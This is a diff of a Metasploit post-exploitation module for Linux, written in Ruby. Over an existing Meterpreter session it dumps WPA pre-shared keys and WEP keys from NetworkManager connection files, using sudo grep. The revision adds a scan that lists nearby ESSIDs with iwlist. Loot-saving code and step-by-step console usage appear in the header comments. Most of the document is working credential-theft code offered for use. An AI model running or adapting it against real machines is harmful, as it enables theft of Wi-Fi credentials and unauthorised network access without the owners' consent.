@@ -16,14 +16,16 @@
 # [ POST-EXPLOITATION MODULE DESCRIPTION ]
 # This module collects 802-11-Wireless-Security credentials such as Access-Point name and
 # Pre-Shared-Key from your target Linux machine using /etc/NetworkManager/system-connections/
-# files. This module also stores the dump data into loot folder (advanced option).
-# HINT: this module requires root privileges to run in non-Kali distros ..
+# files and displays a list of ESSIDs emitting signal (advanced option). This module also
+# stores the dumped data into msf4/loot folder (advanced option).
+# HINT: This module requires root privileges to run in non-Kali distros ..
 #
 #
 # [ MODULE OPTIONS ]
 # The session number to run this module on       => set SESSION 3
-# Dump credentials of remote system?             => set DUMP_CREDS true
-# Store dumps to loot file (.msf4/loot/file.txt) => set STORE_LOOT true
+# Dump credentials from remote system?           => set DUMP_CREDS true
+# Store dumped data to msf4/loot folder?         => set STORE_LOOT true
+# Display list of ESSIDs emitting signal?        => set ESSID_DUMP true
 # The default path for network connections       => set REMOTE_DIR /etc/NetworkManager/system-connections
 #
 #
@@ -35,7 +37,6 @@
 #
 # [ LOAD/USE AUXILIARY ]
 # meterpreter > background
-# msf exploit(handler) > reload_all
 # msf exploit(handler) > use post/linux/gather/wifi_dump_linux
 # msf post(wifi_dump_linux) > info
 # msf post(wifi_dump_linux) > show options
@@ -49,7 +50,7 @@
 # metasploit database deleted/rebuild to be abble to load module.
 # 1 - service postgresql start
 # 2 - msfdb reinit   (optional)
-# 3 - msfconsole -x 'reload_all'
+# 3 - msfconsole -q -x 'reload_all'
 ##
 
 
@@ -82,9 +83,9 @@ class MetasploitModule < Msf::Post
 #
         def initialize(info={})
                 super(update_info(info,
-                        'Name'          => 'ESSID credentials dump (wpa/wep)',
+                        'Name'          => 'ESSID linux credentials dump (wpa/wep)',
                         'Description'   => %q{
-                                        This module collects 802-11-Wireless-Security credentials such as Access-Point name and Pre-Shared-Key from your target CLIENT Linux machine using /etc/NetworkManager/system-connections/ files. This module also stores the dump data into loot folder (advanced option).
+                                        This module collects 802-11-Wireless-Security credentials such as Access-Point name and Pre-Shared-Key from your target Linux machine using /etc/NetworkManager/system-connections/ files and displays a list of ESSIDs emitting signal (advanced option). This module also stores the dumped data into msf4/loot folder (advanced option).
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -92,7 +93,7 @@ class MetasploitModule < Msf::Post
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                 ],
  
-                        'Version'        => '$Revision: 1.4',
+                        'Version'        => '$Revision: 1.5',
                         'DisclosureDate' => 'jun 8 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
@@ -119,12 +120,13 @@ class MetasploitModule < Msf::Post
                 register_options(
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
-                                OptString.new('DUMP_CREDS', [ false, 'Dump credentials of remote system?', false])
+                                OptString.new('DUMP_CREDS', [ false, 'Dump credentials from remote system?', false])
                         ], self.class)
 
                 register_advanced_options(
                         [
-                                OptBool.new('STORE_LOOT', [false, 'Store dumps to loot file (file.txt)', false]),
+                                OptBool.new('STORE_LOOT', [false, 'Store dumped data to msf4/loot folder?', false]),
+                                OptBool.new('ESSID_DUMP', [false, 'Display list of ESSIDs emitting signal?', false]),
                                 OptString.new('REMOTE_DIR', [ true, 'The default path for network connections'])
                         ], self.class)
  
@@ -143,8 +145,8 @@ def ls_stage1
   # to prevent 'unset all' from deleting default options...
   #
   if datastore['DUMP_CREDS'] == 'nil'
-    print_error("Options not configurated correctly...")
-    print_warning("Please set DUMP_CREDS option...")
+    print_error("Options not configurated correctly ..")
+    print_warning("Please set DUMP_CREDS option ..")
     return nil
   else
     print_status("Dumping remote wpa/wep credentials ..")
@@ -167,13 +169,13 @@ def ls_stage1
       data_dump=''
       wpa_out = cmd_exec("sudo grep psk= #{rpath}/*")
       wep_out = cmd_exec("sudo grep wep-key0= #{rpath}/*")
-      # store data in variable
+      # store data in variable (loot funtion)
       data_dump << wpa_out
       data_dump << wep_out
       Rex::sleep(1.0)
 
         #
-        # Display results on screen (wpa|wep) dump/gather info ..
+        # Display results on screen (wpa|wep) ..
         #
         print_line("")
         print_line("WPA CREDENTIALS:")
@@ -187,14 +189,28 @@ def ls_stage1
         print_line("")
         Rex::sleep(0.5)
 
-    #
-    # Store data to msf loot folder (local) ..
-    #
-    if datastore['STORE_LOOT'] == true
-      print_warning("Credentials stored in: .msf4/loot (local) ..")
-      store_loot("wpa/wep_credentials", "text/plain", session, data_dump, "wpa/wep_dump.txt", "output of wpa/wep dump")
-    end
+          #
+          # Display remote ESSIDs available ..
+          #
+          if datastore['ESSID_DUMP'] == true
+            # Store interface in use (remote)
+            interface = cmd_exec("netstat -r | grep default | awk {'print $8'}")
+            # Executing interface scan (essids emitting)
+            essid_out = cmd_exec("sudo iwlist #{interface} scanning | grep ESSID:")
+            print_line("ESSIDs EMITING SIGNAL:")
+            print_line("----------------------")
+            print_line(essid_out)
+            print_line("")
+            Rex::sleep(0.5)
+          end
 
+        #
+        # Store data to msf loot folder (local) ..
+        #
+        if datastore['STORE_LOOT'] == true
+          print_warning("Credentials stored in: ~/.msf4/loot (folder) ..")
+          store_loot("wpa_wep_credentials", "text/plain", session, data_dump, "wpa_wep_dump.txt", "output of wpa/wep dump")
+        end
 
   #
   # error exception funtion
